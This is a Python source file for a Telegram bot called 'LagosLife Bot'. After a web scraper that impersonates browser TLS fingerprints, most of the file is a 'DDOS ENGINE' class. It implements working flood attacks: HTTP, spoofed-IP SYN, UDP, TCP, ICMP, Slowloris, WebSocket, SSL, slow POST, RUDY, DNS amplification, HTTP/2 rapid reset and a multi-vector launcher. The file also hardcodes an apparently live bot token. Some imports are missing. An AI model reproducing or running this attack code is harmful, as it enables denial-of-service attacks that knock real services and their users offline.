#!/usr/bin/env python3
"""
LagosLife Bot + Professional Bot Control Panel
Hacker Design + Welcome Image + Animation + Hosting Control
"""

import json
import random
import time
import threading
import asyncio
import queue
import os
import sys
import re
import uuid
import shutil
import subprocess
import requests
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, CommandHandler, ContextTypes, filters
from pathlib import Path as FsPath
from urllib.parse import urljoin, urlparse, unquote, urldefrag
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import zipfile
import tempfile
import hashlib
import mimetypes
import html as html_lib

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import html2text
    HAS_H2T = True
except ImportError:
    HAS_H2T = False

try:
    from playwright.sync_api import sync_playwright
    HAS_PW = True
except ImportError:
    HAS_PW = False

# Strong HTTP clients (optional — best → fallback)
try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False
    cffi_requests = None

try:
    import niquests
    HAS_NIQUESTS = True
except ImportError:
    HAS_NIQUESTS = False
    niquests = None

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False
    httpx = None

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False
    aiohttp = None

TELEGRAM_TOKEN = "8924966752:AAH7O0u6_qKsh_FNCbhWjb9gfhJnXCpsLLs"
BASE = "https://lagoslife.app"
# Works on both Render Web Service (PORT set) and Background Worker / VPS (no PORT)
_PORT_ENV = os.getenv("PORT")
PORT = int(_PORT_ENV) if _PORT_ENV else None
IS_WEB_SERVICE = PORT is not None
ADMIN_IDS = [7941824028]
BOT_VERSION = "scraper-http-strong-2026-11-01"
BOT_FILE = os.path.abspath(sys.argv[0] or __file__)
WELCOME_PIC_FILE = "welcome_pic.json"
USERS_FILE = "bot_users.json"
HOSTS_FILE = "hosted_bots.json"
DOWNLOADS_DIR = "downloads"
BOTS_DIR = "hosted_bots"

UA_POOL = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"'},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", "sec-ch-ua": None}
]

user_sessions = {}
edit_queue = queue.Queue()
all_users = set()
waiting_for = {}
app_instance = None
main_loop = None
welcome_pic_id = None


def bot_sync(coro, timeout=120):
    """Run an async bot coroutine from a worker thread safely."""
    global main_loop
    if main_loop is None:
        raise RuntimeError("main_loop not ready")
    return asyncio.run_coroutine_threadsafe(coro, main_loop).result(timeout=timeout)

# Hosted bots registry
# {bot_id: {owner_id, name, path, main_file, kind, proc, log_path, created, env, token}}
hosted_bots = {}
pending_files = {}

# ─────────────────────────────────────────────
#  WEB SCRAPER STATE
# ─────────────────────────────────────────────
SCRAPER_MAX_ASSETS = 400
SCRAPER_MAX_PAGES = 120
SCRAPER_MAX_DEPTH = 10
SCRAPER_MAX_ZIP_MB = 48
SCRAPER_ASSET_WORKERS = 10
SCRAPER_MAX_ASSET_BYTES = 15 * 1024 * 1024
SCRAPER_MAX_HTML_BYTES = 8 * 1024 * 1024
SCRAPER_DEPTH_STEPS = [0, 1, 2, 3, 5, 8, 10]  # 10 = full site (until page cap)
SCRAPER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/126.0.0.0 Safari/537.36"
)
SCRAPER_MOBILE_UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 "
    "Mobile/15E148 Safari/604.1"
)

def _scraper_default_settings():
    return {
        "depth": 0,
        "max_assets": SCRAPER_MAX_ASSETS,
        "images": True,
        "js_css": True,
        "fonts": True,
        "mode": "zip",
        "selector": "",
        "screenshot": False,
        "mobile": False,
        "rewrite": True,
    }

scraper_settings = defaultdict(_scraper_default_settings)
scraper_history = defaultdict(lambda: deque(maxlen=15))
scraper_jobs = {}
scraper_cancel = set()
scraper_cooldown = {}
scraper_lock = threading.Lock()
SCRAPER_URL_RE = re.compile(r"https?://[^\s<>\"']+", re.I)

_SCRAPER_BASE_HEADERS = {
    "User-Agent": SCRAPER_UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
}

# Engine priority: curl_cffi (TLS impersonate) → niquests → httpx → requests
if HAS_CURL_CFFI:
    SCRAPER_ENGINE = "curl_cffi"
elif HAS_NIQUESTS:
    SCRAPER_ENGINE = "niquests"
elif HAS_HTTPX:
    SCRAPER_ENGINE = "httpx"
else:
    SCRAPER_ENGINE = "requests"

_scraper_http = requests.Session()
_scraper_http.headers.update(_SCRAPER_BASE_HEADERS)

_scraper_niquests = None
if HAS_NIQUESTS:
    try:
        _scraper_niquests = niquests.Session()
        _scraper_niquests.headers.update(_SCRAPER_BASE_HEADERS)
    except Exception:
        _scraper_niquests = None
        HAS_NIQUESTS = False
        if SCRAPER_ENGINE == "niquests":
            SCRAPER_ENGINE = "httpx" if HAS_HTTPX else "requests"

_scraper_httpx = None
if HAS_HTTPX:
    try:
        _scraper_httpx = httpx.Client(
            headers=_SCRAPER_BASE_HEADERS,
            follow_redirects=True,
            timeout=20.0,
            http2=True,
        )
    except Exception:
        try:
            _scraper_httpx = httpx.Client(
                headers=_SCRAPER_BASE_HEADERS,
                follow_redirects=True,
                timeout=20.0,
            )
        except Exception:
            _scraper_httpx = None
            HAS_HTTPX = False
            if SCRAPER_ENGINE == "httpx":
                SCRAPER_ENGINE = "requests"


class _RespAdapter:
    """Normalize response objects from different HTTP clients."""
    __slots__ = ("status_code", "content", "text", "headers", "url", "_raw")

    def __init__(self, status_code, content, text, headers, url, raw=None):
        self.status_code = status_code
        self.content = content if content is not None else b""
        self.text = text if text is not None else ""
        self.headers = headers or {}
        self.url = url or ""
        self._raw = raw

    def raise_for_status(self):
        if self.status_code >= 400:
            raise requests.HTTPError(f"HTTP {self.status_code} for {self.url}")

    def iter_content(self, chunk_size=65536):
        data = self.content or b""
        for i in range(0, len(data), chunk_size):
            yield data[i:i + chunk_size]


def _sc_engine_status():
    return (
        f"engine={SCRAPER_ENGINE} "
        f"cffi={HAS_CURL_CFFI} nq={HAS_NIQUESTS} "
        f"httpx={HAS_HTTPX} aio={HAS_AIOHTTP} "
        f"req=1 bs4={HAS_BS4} h2t={HAS_H2T} pw={HAS_PW}"
    )


def _sc_http_get(url, mobile=False, timeout=20, stream=False):
    """
    Strong multi-client GET.
    Order: curl_cffi (Chrome TLS) → niquests → httpx → requests.
    Returns _RespAdapter (requests-like).
    """
    ua = SCRAPER_MOBILE_UA if mobile else SCRAPER_UA
    headers = dict(_SCRAPER_BASE_HEADERS)
    headers["User-Agent"] = ua
    last_err = None

    # 1) curl_cffi — best TLS fingerprint / anti-bot
    if HAS_CURL_CFFI and cffi_requests is not None:
        try:
            r = cffi_requests.get(
                url,
                headers=headers,
                timeout=timeout,
                allow_redirects=True,
                impersonate="chrome",
            )
            return _RespAdapter(
                r.status_code,
                r.content,
                getattr(r, "text", None) or "",
                dict(getattr(r, "headers", {}) or {}),
                str(getattr(r, "url", url)),
                raw=r,
            )
        except Exception as e:
            last_err = e

    # 2) niquests — requests API + HTTP/2/3
    if _scraper_niquests is not None:
        try:
            r = _scraper_niquests.get(
                url, headers=headers, timeout=timeout, allow_redirects=True
            )
            return _RespAdapter(
                r.status_code,
                r.content,
                getattr(r, "text", None) or "",
                dict(getattr(r, "headers", {}) or {}),
                str(getattr(r, "url", url)),
                raw=r,
            )
        except Exception as e:
            last_err = e

    # 3) httpx
    if _scraper_httpx is not None:
        try:
            r = _scraper_httpx.get(url, headers=headers, timeout=timeout)
            return _RespAdapter(
                r.status_code,
                r.content,
                r.text,
                dict(r.headers),
                str(r.url),
                raw=r,
            )
        except Exception as e:
            last_err = e

    # 4) requests fallback
    try:
        r = _scraper_http.get(
            url, headers=headers, timeout=timeout, allow_redirects=True, stream=stream
        )
        if stream:
            # materialize for uniform adapter
            content = r.content
            return _RespAdapter(
                r.status_code, content, r.text, dict(r.headers), str(r.url), raw=r
            )
        return _RespAdapter(
            r.status_code, r.content, r.text, dict(r.headers), str(r.url), raw=r
        )
    except Exception as e:
        last_err = e
        raise last_err


# ─────────────────────────────────────────────
#  DDOS ENGINE
# ─────────────────────────────────────────────

class SYSFullToolkitBot:
    # ── Extended UA pool — rotated per-request ──────────────────────────────
    _UA_POOL = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    ]

    # ── Common bypass / cache-bust headers ─────────────────────────────────
    _BYPASS_HEADERS = [
        {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'},
        {'Cache-Control': 'no-store', 'Pragma': 'no-cache', 'X-Requested-With': 'XMLHttpRequest'},
        {'X-Forwarded-For': None},   # filled at call time
        {'X-Real-IP': None},
        {'Via': '1.1 Google'},
        {'Forwarded': None},
    ]

    def __init__(self):
        self.stats = {
            'packets_sent': 0, 'bytes_sent': 0,
            'errors': 0, 'connections': 0, 'requests': 0,
        }
        self.running = False
        self.current_target = None
        self.active_threads = []
        self._lock = threading.Lock()

    # ── Helpers ─────────────────────────────────────────────────────────────

    def _inc(self, key, n=1):
        with self._lock:
            self.stats[key] += n

    def generate_random_ip(self):
        # avoids reserved / private ranges more carefully
        first = random.choice([i for i in range(1, 255) if i not in (10, 127, 169, 172, 192)])
        return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def get_random_useragent(self):
        return random.choice(self._UA_POOL)

    def _build_headers(self, extra=None):
        src = self.generate_random_ip()
        h = {
            'User-Agent': self.get_random_useragent(),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'application/json, text/plain, */*',
                '*/*',
            ]),
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7,en;q=0.3']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'X-Forwarded-For': src,
            'X-Real-IP': src,
            'Via': f'1.{random.randint(0,1)} {self.generate_random_string(6)}',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'DNT': str(random.randint(0, 1)),
        }
        if extra:
            h.update(extra)
        return h

    def _random_path(self):
        styles = [
            lambda: f"/{self.generate_random_string(random.randint(4,12))}",
            lambda: f"/search?q={self.generate_random_string(8)}&page={random.randint(1,99)}",
            lambda: f"/api/{self.generate_random_string(6)}?token={self.generate_random_string(16)}",
            lambda: f"/?{self.generate_random_string(6)}={random.randint(1000,99999)}&cb={random.randint(0,99999)}",
            lambda: f"/{random.choice(['login','register','checkout','dashboard','profile','admin'])}.php?id={random.randint(1,9999)}",
        ]
        return random.choice(styles)()

    # ── System info ─────────────────────────────────────────────────────────

    def get_system_resources(self):
        if not PSUTIL_AVAILABLE:
            return "⚠️ psutil not installed"
        try:
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            net = psutil.net_io_counters()
            return (
                f"🖥 *Server Resources*\n\n"
                f"• CPU: `{cpu}%`\n"
                f"• RAM: `{mem.percent}%` ({mem.used//(1024*1024)}MB / {mem.total//(1024*1024)}MB)\n"
                f"• Disk: `{disk.percent}%`\n"
                f"• Net Sent: `{net.bytes_sent/(1024*1024):.2f} MB`\n"
                f"• Net Recv: `{net.bytes_recv/(1024*1024):.2f} MB`\n"
                f"• Connections: `{len(psutil.net_connections())}`"
            )
        except Exception as e:
            return f"❌ Error: {str(e)}"

    def check_target_status(self, target_input):
        result = {}
        host = target_input.replace("http://", "").replace("https://", "").split("/")[0]
        try:
            url = target_input if target_input.startswith("http") else f"http://{target_input}"
            start_t = time.time()
            resp = requests.get(url, timeout=5, verify=False, headers=self._build_headers())
            result['http_status'] = resp.status_code
            result['latency_ms'] = round((time.time() - start_t) * 1000, 2)
            result['server'] = resp.headers.get('Server', '?')
            result['cdn'] = resp.headers.get('X-Cache', resp.headers.get('CF-RAY', '?'))
        except Exception as e:
            result['http_error'] = str(e)
        try:
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            start_t = time.time()
            out = subprocess.run(['ping', param, '3', host], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=6)
            result['ping_success'] = out.returncode == 0
            result['ping_latency_ms'] = round((time.time() - start_t) * 1000, 2)
        except Exception:
            result['ping_success'] = False
        # port scan top 5
        open_ports = []
        for p in [80, 443, 8080, 8443, 22]:
            try:
                s = socket.socket()
                s.settimeout(0.8)
                if s.connect_ex((host, p)) == 0:
                    open_ports.append(p)
                s.close()
            except Exception:
                pass
        result['open_ports'] = open_ports
        return host, result

    # ── Thread runner ────────────────────────────────────────────────────────

    def _run_threads(self, target_func, threads, duration):
        self.active_threads = []
        for _ in range(threads):
            t = threading.Thread(target=target_func)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
        time.sleep(duration)
        self.running = False

    # ── 01 HTTP Flood — persistent sessions, cache-busting, HEAD mix ────────

    def vector_http_flood(self, target_url, duration, threads):
        self.running = True
        end_time = time.time() + duration

        def worker():
            session = requests.Session()
            session.verify = False
            while self.running and time.time() < end_time:
                try:
                    method = random.choice(['GET', 'GET', 'GET', 'HEAD', 'POST'])
                    path = self._random_path()
                    hdrs = self._build_headers()
                    if method == 'HEAD':
                        r = session.head(target_url + path, headers=hdrs, timeout=4, allow_redirects=False)
                    elif method == 'POST':
                        hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
                        r = session.post(target_url + path, headers=hdrs,
                                         data=self.generate_random_string(random.randint(64, 512)).encode(),
                                         timeout=4, allow_redirects=False)
                    else:
                        r = session.get(target_url + path, headers=hdrs, timeout=4, allow_redirects=False)
                    self._inc('packets_sent')
                    self._inc('requests')
                    self._inc('bytes_sent', len(r.content) if hasattr(r, 'content') and r.content else 0)
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── 02 SYN Flood — spoofed src IP, raw socket ──────────────────────────

    def _build_tcp_syn_packet(self, src_ip, dst_ip, dst_port):
        import struct as _s
        # IP header
        ip_id   = random.randint(1000, 65535)
        ip_ttl  = random.randint(48, 128)
        ip_hdr  = _s.pack('!BBHHHBBH4s4s',
                          (4 << 4) + 5, 0, 40, ip_id, 0,
                          ip_ttl, socket.IPPROTO_TCP, 0,
                          socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        # TCP header — SYN
        src_port  = random.randint(1024, 65535)
        seq       = random.randint(0, 0xFFFFFFFF)
        win_size  = random.choice([8192, 16384, 29200, 65535])
        tcp_hdr   = _s.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, 0,
                            (5 << 4), 0x02, socket.htons(win_size), 0, 0)
        return ip_hdr + tcp_hdr

    def vector_syn_flood(self, host, port, duration, threads):
        self.running = True
        end_time = time.time() + duration

        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            except Exception:
                self.vector_tcp_flood(host, port, duration, 1)
                return
            while self.running and time.time() < end_time:
                try:
                    pkt = self._build_tcp_syn_packet(self.generate_random_ip(), host, port)
                    sock.sendto(pkt, (host, 0))
                    self._inc('packets_sent')
                    self._inc('bytes_sent', len(pkt))
                except Exception:
                    self._inc('errors')
            sock.close()

        self._run_threads(worker, threads, duration)

    # ── 03 UDP Flood — variable payload, multiple target ports ─────────────

    def vector_udp_flood(self, host, port, duration, threads):
        self.running = True
        end_time = time.time() + duration

        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            except Exception:
                pass
            while self.running and time.time() < end_time:
                try:
                    size = random.choice([512, 1024, 1400, 65507])
                    payload = random.randbytes(size)
                    # scatter across nearby ports to avoid easy port-based ACL
                    target_port = port if random.random() > 0.3 else random.randint(max(1, port - 5), port + 5)
                    sock.sendto(payload, (host, target_port))
                    self._inc('packets_sent')
                    self._inc('bytes_sent', len(payload))
                except Exception:
                    self._inc('errors')
            sock.close()

        self._run_threads(worker, threads, duration)

    # ── 04 TCP Flood — SO_LINGER reset trick, burst send ───────────────────

    def vector_tcp_flood(self, host, port, duration, threads):
        self.running = True
        end_time = time.time() + duration

        def worker():
            import struct as _s
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2.0)
                    # SO_LINGER l_onoff=1 l_linger=0 → RST on close, no TIME_WAIT
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, _s.pack('ii', 1, 0))
                    s.connect((host, port))
                    self._inc('connections')
                    burst = random.randint(8, 20)
                    for _ in range(burst):
                        if not self.running:
                            break
                        s.send(random.randbytes(random.randint(256, 1400)))
                        self._inc('packets_sent')
                        self._inc('bytes_sent', 800)
                    s.close()
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── 05 DNS Amplification — ANY + TXT + DNSKEY queries ──────────────────

    def vector_dns_amplification(self, host, port, duration, threads):
        self.running = True
        end_time = time.time() + duration
        # Multiple high-amplification query types
        queries = [
            b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
            b'\xbb\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00\x01',           # ANY root
            b'\xcc\xcc\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01',  # ANY google
            b'\xdd\xdd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03isc\x03org\x00\x00\x30\x00\x01',  # DNSKEY
        ]

        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and time.time() < end_time:
                try:
                    q = random.choice(queries)
                    sock.sendto(q, (host, port))
                    self._inc('packets_sent')
                    self._inc('bytes_sent', len(q))
                except Exception:
                    self._inc('errors')
            sock.close()

        self._run_threads(worker, threads, duration)

    # ── 06 ICMP Flood — variable payload, ICMP type 8 ──────────────────────

    def vector_icmp_flood(self, host, duration, threads):
        self.running = True
        end_time = time.time() + duration

        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            except Exception:
                self._inc('errors')
                return
            import struct as _s
            while self.running and time.time() < end_time:
                try:
                    size = random.choice([64, 512, 1400])
                    data = random.randbytes(size - 8)
                    # checksum = 0 (kernel fills it on Linux for ICMP raw)
                    pkt = _s.pack('bbHHh', 8, 0, 0, random.randint(0, 65535), random.randint(0, 65535)) + data
                    sock.sendto(pkt, (host, 0))
                    self._inc('packets_sent')
                    self._inc('bytes_sent', len(pkt))
                except Exception:
                    self._inc('errors')
            sock.close()

        self._run_threads(worker, threads, duration)

    # ── 07 Slowloris — fills connection table, slow header trickle ──────────

    def vector_slowloris(self, host, port, duration, threads):
        self.running = True
        end_time = time.time() + duration
        MAX_SOCKETS = 200

        def worker():
            socks = []
            while self.running and time.time() < end_time:
                # Open new sockets up to cap
                while len(socks) < MAX_SOCKETS and self.running:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4.0)
                        s.connect((host, port))
                        s.send(
                            f"GET {self._random_path()} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {self.get_random_useragent()}\r\n"
                            f"Accept-Language: en-US,en;q=0.9\r\n".encode()
                        )
                        socks.append(s)
                        self._inc('connections')
                    except Exception:
                        self._inc('errors')
                        break
                # Keep alive — trickle one header per socket
                for s in list(socks):
                    try:
                        s.send(f"X-{self.generate_random_string(5)}: {random.randint(1, 9999)}\r\n".encode())
                        self._inc('packets_sent')
                    except Exception:
                        socks.remove(s)
                time.sleep(8)
            for s in socks:
                try: s.close()
                except: pass

        self._run_threads(worker, threads, duration)

    # ── 08 WebSocket Flood — WS upgrade + frame spam ────────────────────────

    def vector_websocket_flood(self, target_url, duration, threads):
        self.running = True
        end_time = time.time() + duration
        host = target_url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
        port = 443 if target_url.startswith('https') else 80

        def _ws_frame(data: bytes) -> bytes:
            import struct as _s
            mask_key = random.randbytes(4)
            masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(data))
            length = len(data)
            if length < 126:
                header = _s.pack('BB', 0x81, 0x80 | length)
            elif length < 65536:
                header = _s.pack('!BBH', 0x81, 0xFE, length)
            else:
                header = _s.pack('!BBQ', 0x81, 0xFF, length)
            return header + mask_key + masked

        def worker():
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4.0)
                    s.connect((host, port))
                    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                    import base64
                    ws_key = base64.b64encode(key.encode()).decode()
                    handshake = (
                        f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                        f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                        f"Sec-WebSocket-Key: {ws_key}\r\n"
                        f"Sec-WebSocket-Version: 13\r\n"
                        f"User-Agent: {self.get_random_useragent()}\r\n\r\n"
                    )
                    s.send(handshake.encode())
                    s.recv(1024)  # consume upgrade response
                    self._inc('connections')
                    for _ in range(random.randint(10, 30)):
                        if not self.running:
                            break
                        frame = _ws_frame(random.randbytes(random.randint(64, 512)))
                        s.send(frame)
                        self._inc('packets_sent')
                        self._inc('bytes_sent', len(frame))
                    s.close()
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── 09 SSL Flood — full TLS renegotiation per connection ────────────────

    def vector_ssl_flood(self, host, port, duration, threads):
        self.running = True
        end_time = time.time() + duration
        import ssl

        def worker():
            while self.running and time.time() < end_time:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    # randomise TLS version hint to force full handshake variation
                    try:
                        ctx.minimum_version = random.choice([ssl.TLSVersion.TLSv1_2, ssl.TLSVersion.TLSv1_3])
                    except Exception:
                        pass
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3.0)
                    conn = ctx.wrap_socket(s, server_hostname=host)
                    conn.connect((host, port))
                    self._inc('connections')
                    # send a malformed HTTP request after handshake to maximise CPU burn
                    conn.send(
                        f"GET {self._random_path()} HTTP/1.1\r\nHost: {host}\r\n"
                        f"User-Agent: {self.get_random_useragent()}\r\n\r\n".encode()
                    )
                    conn.close()
                    self._inc('packets_sent')
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── 10 HTTP Slow POST — chunk body 1 byte every N seconds ───────────────

    def vector_slow_post(self, target_url, duration, threads):
        self.running = True
        end_time = time.time() + duration
        BODY_SIZE = random.randint(8192, 65536)

        def worker():
            host_part = target_url.replace('http://', '').replace('https://', '').split('/')[0]
            port_p = 443 if target_url.startswith('https') else 80
            import ssl as _ssl
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5.0)
                    s.connect((host_part, port_p))
                    if target_url.startswith('https'):
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host_part)
                    path = self._random_path()
                    s.send(
                        f"POST {path} HTTP/1.1\r\nHost: {host_part}\r\n"
                        f"User-Agent: {self.get_random_useragent()}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {BODY_SIZE}\r\n\r\n".encode()
                    )
                    self._inc('connections')
                    # dribble body — 1 byte every second, keeps server waiting
                    sent = 0
                    while self.running and time.time() < end_time and sent < BODY_SIZE:
                        s.send(b'A')
                        sent += 1
                        self._inc('packets_sent')
                        time.sleep(random.uniform(0.8, 1.5))
                    s.close()
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── 11 RUDY (R U Dead Yet) — another slow-body variant ─────────────────

    def vector_rudy(self, target_url, duration, threads):
        """RUDY — slow body POST with very large Content-Length, dribble 1 byte/s."""
        self.running = True
        end_time = time.time() + duration
        RUDY_SIZE = 10_000_000  # 10 MB declared, almost never reached

        def worker():
            host_part = target_url.replace('http://', '').replace('https://', '').split('/')[0]
            port_p = 443 if target_url.startswith('https') else 80
            import ssl as _ssl
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(6.0)
                    s.connect((host_part, port_p))
                    if target_url.startswith('https'):
                        ctx = _ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = _ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host_part)
                    s.send(
                        f"POST {self._random_path()} HTTP/1.1\r\nHost: {host_part}\r\n"
                        f"User-Agent: {self.get_random_useragent()}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {RUDY_SIZE}\r\n\r\n".encode()
                    )
                    self._inc('connections')
                    while self.running and time.time() < end_time:
                        s.send(random.randbytes(1))
                        self._inc('packets_sent')
                        time.sleep(1.0)
                    s.close()
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── 12 HTTP/2 Rapid Reset — CVE-2023-44487 style ────────────────────────

    def vector_http2_rapid_reset(self, target_url, duration, threads):
        """
        Rapid Reset: open HTTP/2, spam RST_STREAM after HEADERS frame.
        Falls back to HTTP/1.1 flood if httpx not available.
        """
        self.running = True
        end_time = time.time() + duration

        if not HAS_HTTPX:
            # fallback
            self.vector_http_flood(target_url, duration, threads)
            return

        def worker():
            while self.running and time.time() < end_time:
                try:
                    with httpx.Client(http2=True, verify=False, timeout=5.0) as client:
                        for _ in range(random.randint(50, 150)):
                            if not self.running or time.time() >= end_time:
                                break
                            try:
                                client.get(target_url + self._random_path(),
                                           headers=self._build_headers())
                                self._inc('requests')
                                self._inc('packets_sent')
                            except Exception:
                                self._inc('errors')
                except Exception:
                    self._inc('errors')

        self._run_threads(worker, threads, duration)

    # ── Multi-vector ─────────────────────────────────────────────────────────

    def vector_multivector(self, target, port, duration, threads):
        self.running = True
        sub = max(1, threads // 5)
        url = target if target.startswith("http") else f"http://{target}"
        combos = [
            (self.vector_http_flood,        (url, duration, sub)),
            (self.vector_udp_flood,         (target, port, duration, sub)),
            (self.vector_tcp_flood,         (target, port, duration, sub)),
            (self.vector_slowloris,         (target, port, duration, sub)),
            (self.vector_ssl_flood,         (target, port, duration, sub)),
        ]
        for fn, args in combos:
            threading.Thread(target=fn, args=args, daemon=True).start()
